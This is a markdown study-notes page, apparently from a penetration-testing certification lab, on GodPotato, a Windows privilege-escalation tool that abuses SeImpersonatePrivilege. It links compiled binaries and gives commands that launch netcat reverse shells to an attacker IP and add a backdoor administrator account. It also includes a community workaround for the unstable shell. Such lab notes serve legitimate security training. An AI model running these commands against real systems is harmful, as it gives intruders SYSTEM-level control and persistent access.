---
title: GodPotato - SeImpersonatePrivilege abuse
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - privilege
  - SeImpersonatePrivilege
---
#  🥔 GodPotato: SeImpersonatePrivilege abuse


!!! abstract "But It's a Potato!"
	**Remarkable explanation about the Potato world and what is going under the hood**: [https://jlajara.gitlab.io/Potatoes_Windows_Privesc](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)


!!! note "Hot binaries!"
	My potato compiled binaries: [https://github.com/amandaguglieri/Privescalation/tree/main/tools/SeImpersonatePrivilege](https://github.com/amandaguglieri/Privescalation/tree/main/tools/SeImpersonatePrivilege)


Based on the history of Potato privilege escalation for 6 years, from the beginning of RottenPotato to the end of JuicyPotatoNG, I discovered a new technology by researching DCOM, which enables privilege escalation in Windows 2012 - Windows 2022, now as long as you have "ImpersonatePrivilege" permission. Then you are "NT AUTHORITY\SYSTEM", usually WEB services and database services have "ImpersonatePrivilege" permissions.

Potato privilege escalation is usually used when we obtain WEB/database privileges. We can elevate a service user with low privileges to "NT AUTHORITY\SYSTEM" privileges. However, the historical Potato has no way to run on the latest Windows system. When I was researching DCOM, I found a new method that can perform privilege escalation. There are some defects in rpcss when dealing with oxid, and rpcss is a service that must be opened by the system. , so it can run on almost any Windows OS, I named it GodPotato
Repo: https://github.com/BeichenDream/GodPotato

Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11


Download the binaries from the release folder at: [https://github.com/amandaguglieri/Privescalation/tree/main/tools/SeImpersonatePrivilege/GodPotato/releases](https://github.com/amandaguglieri/Privescalation/tree/main/tools/SeImpersonatePrivilege/GodPotato/releases)

Example of privilege escalation in oscp-relia:

```
.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.169 5555 -e cmd.exe"
.\GodPotato-NET35.exe -cmd ".\nc.exe 192.168.45.169 5555 -e cmd.exe"
.\GodPotato-NET2.exe -cmd ".\nc.exe 192.168.45.169 5555 -e cmd.exe"


.\GodPotato-NET4.exe  -cmd "net user lala Lalala123 /add"
.\GodPotato-NET4.exe  -cmd "net localgroup Administrators lala /add"
.\GodPotato-NET4.exe  -cmd "net localgroup "Remote Management Users" lala /add"


```


## Well-known issues in the community

The reverse shell provided by GodPotato is not stable precisely.  Sometimes the reverse shell is not achieved. Then you stay with creating a user and adding to a localgroup.  And sometimes reverse is achieved, but some commands (a simple whoami for instance) do not resolve.

I haven't tried this one yet, but the community suggest this workaround:

```powershell
cmd /c GodPotato-NET4.exe -cmd "cmd /c C:\Users\Public\Documents\nc64.exe -t -e C:\Windows\System32\cmd.exe $IPAttacker $PortAttacher443
```


**GodPotato vs SweetPotato**

GodPotato captures the child process stdin and stdout handles with pipes and relays them to the terminal (createProcessReadOut in [https://github.com/BeichenDream/GodPotato/blob/main/SharpToken.cs](https://github.com/BeichenDream/GodPotato/blob/main/SharpToken.cs)) while SweetPotato just tries to open the child in a new terminal (look at the CreateProcess calls in [https://github.com/CCob/SweetPotato/blob/master/Program.cs](https://github.com/CCob/SweetPotato/blob/master/Program.cs))





